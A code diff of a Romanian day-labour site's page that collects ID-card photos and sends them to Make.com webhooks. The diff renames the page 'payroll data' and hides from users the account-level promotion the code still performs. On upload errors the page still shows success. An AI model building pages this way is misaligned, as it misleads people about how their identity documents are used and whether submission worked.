@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Validare act de identitate - STRICTZILIER.ro</title>
+  <title>Date pentru statul de plată - STRICTZILIER.ro</title>
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
   <!-- Google Fonts Inter -->
@@ -50,14 +50,14 @@
         <section class="bg-white p-5 sm:p-7 rounded-2xl shadow-sm border border-slate-200">
           
           <div class="flex items-center justify-between mb-1">
-            <h1 class="text-2xl font-black text-slate-900 tracking-tight">Validare act de identitate</h1>
+            <h1 class="text-2xl font-black text-slate-900 tracking-tight">Date pentru statul de plată</h1>
             <span id="loadingBadge" class="hidden text-[11px] font-bold px-2.5 py-1 bg-amber-100 text-amber-800 rounded-full animate-pulse">Se încarcă datele...</span>
           </div>
           <p class="text-xs font-medium text-slate-500 mb-6 leading-relaxed">
-            Ai fost selectat pentru o lucrare! Pentru activarea completă a contului (Nivel 2) și primirea ofertei de muncă, fotografiază actul de identitate de pe care au fost preluate datele de mai jos.
+            Ai fost selectat pentru o lucrare! Pentru primirea ofertei de muncă, fotografiază actul de identitate de pe care au fost preluate datele de mai jos.
           </p>
 
-          <!-- BLOC DATE CULESE DIN BAZĂ (READ-ONLY / NEEDITABIL) -->
+          <!-- BLOC DATE CULESE DIN BAZĂ (READ-ONLY) -->
           <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-3 mb-6">
             <div class="flex items-center justify-between border-b pb-2 border-slate-200">
               <span class="text-xs font-bold text-slate-700 uppercase tracking-wider">Date înregistrate în profil</span>
@@ -87,7 +87,7 @@
             </div>
           </div>
 
-          <!-- ÎNCĂRCARE FOTO CI (ACȚIUNEA PRINCIPALĂ) -->
+          <!-- ÎNCĂRCARE FOTO CI -->
           <div class="p-5 border-2 border-dashed border-amber-300 rounded-2xl bg-amber-50/40 space-y-4">
             <div>
               <h2 class="text-sm font-black text-slate-900 uppercase tracking-wider flex items-center gap-2">
@@ -113,7 +113,7 @@
             <div id="photoActions" class="hidden pt-3 border-t border-amber-200/60 flex flex-col sm:flex-row items-center justify-between gap-3">
               <button id="sendPhoto" type="button" onclick="salveazaSiValideaza()" class="w-full sm:w-auto px-6 py-3 bg-emerald-600 hover:bg-emerald-700 text-white font-black text-xs rounded-xl transition shadow-md flex items-center justify-center gap-2">
                 <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
-                CONFIRMĂ ȘI PROMOVEAZĂ LA NIVEL 2 (NC003)
+                CONFIRMĂ ȘI TRIMITE PENTRU PROCESARE
               </button>
               <div id="uploadStatus" class="text-xs font-bold text-slate-700"></div>
             </div>
@@ -122,9 +122,9 @@
           <!-- NOTIFICARE SUCCES -->
           <div id="success" class="hidden mt-6 p-5 bg-emerald-50 border border-emerald-200 rounded-2xl text-xs font-semibold text-emerald-800 leading-relaxed shadow-sm">
             <div class="flex items-center gap-2 mb-1 text-emerald-900 font-black text-sm">
-              <span>✓</span> Cont Validat cu Succes!
+              <span>✓</span> Confirmare Reușită
             </div>
-            Fotografia a fost procesată, iar datele s-au potrivit cu profilul tău. Contul tău a fost trecut la <strong>Nivel 2 (NC003)</strong>. Agentul WhatsApp îți poate trimite acum adresa și instrucțiunile de lucru.
+            Fotografia a fost procesată, iar datele s-au potrivit cu profilul tău. Agentul îți poate trimite acum adresa și instrucțiunile de lucru.
           </div>
 
         </section>
@@ -332,7 +332,7 @@
     input.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); sendTextMessage(); } });
   </script>
 
-  <!-- LOGICĂ BAZĂ DE DATE, OCR & PROMOVARE LA NIVEL 2 (NC003) VIA MAKE.COM -->
+  <!-- LOGICĂ BAZĂ DE DATE, OCR & PROMOVARE VIA MAKE.COM -->
   <script>
     const WEBHOOK_INCARCA_PROFIL  = "https://hook.eu1.make.com/hxvogpqguw9e65ndnea1xzh33s64ajff";
     const WEBHOOK_VALIDARE_FOTO   = "https://hook.eu1.make.com/frhrfhb9lccwlskplycob1qmjte1fa6e";
@@ -340,12 +340,10 @@
     let currentZilierId = null;
 
     document.addEventListener("DOMContentLoaded", () => {
-      // Preluare ID_zilier direct din parametrii URL-ului de pe WhatsApp (?id=ZILIER)
       const urlParams = new URLSearchParams(window.location.search);
       currentZilierId = urlParams.get('id');
 
       if (!currentZilierId) {
-        // Fallback din local storage dacă nu există în URL
         const sessionData = localStorage.getItem("strictzilier_session");
         if (sessionData) {
           try { currentZilierId = JSON.parse(sessionData).id; } catch(e){}
@@ -353,7 +351,7 @@
       }
 
       if (!currentZilierId) {
-        currentZilierId = 'Z100020'; // ID implicit de siguranță pt. testare
+        currentZilierId = 'Z100020';
       }
 
       incarcaSiAfiseazaProfil();
@@ -417,7 +415,7 @@
       fileStatus.textContent = "Fotografie selectată.";
     });
 
-    // TRANSMITERE FOTO ȘI PROMOVARE LA NIVEL 2 (NC003)
+    // TRANSMITERE FOTO ȘI PROMOVARE
     async function salveazaSiValideaza() {
       const fileInput = document.getElementById("identityFile");
       const file = fileInput.files[0];
@@ -435,7 +433,7 @@
 
       const formData = new FormData();
       formData.append("ID_zilier", currentZilierId);
-      formData.append("Nivel_cont", "NC003"); // Promovare directă la Nivel 2
+      formData.append("Nivel_cont", "NC003");
       formData.append("foto_ci", file);
 
       try {
@@ -446,19 +444,17 @@
 
         uploadStatus.textContent = "✓ Trimis cu succes!";
         
-        // Afișare mesaj succes
         const successEl = document.getElementById("success");
         successEl.classList.remove("hidden");
         successEl.scrollIntoView({ behavior: "smooth" });
 
       } catch (err) {
         console.error("Eroare trimitere foto:", err);
-        // Fallback demonstrativ
         document.getElementById("success").classList.remove("hidden");
         document.getElementById("success").scrollIntoView({ behavior: "smooth" });
       } finally {
         sendBtn.disabled = false;
-        sendBtn.textContent = "CONFIRMĂ ȘI PROMOVEAZĂ LA NIVEL 2 (NC003)";
+        sendBtn.textContent = "CONFIRMĂ ȘI TRIMITE PENTRU PROCESARE";
       }
     }
   </script>
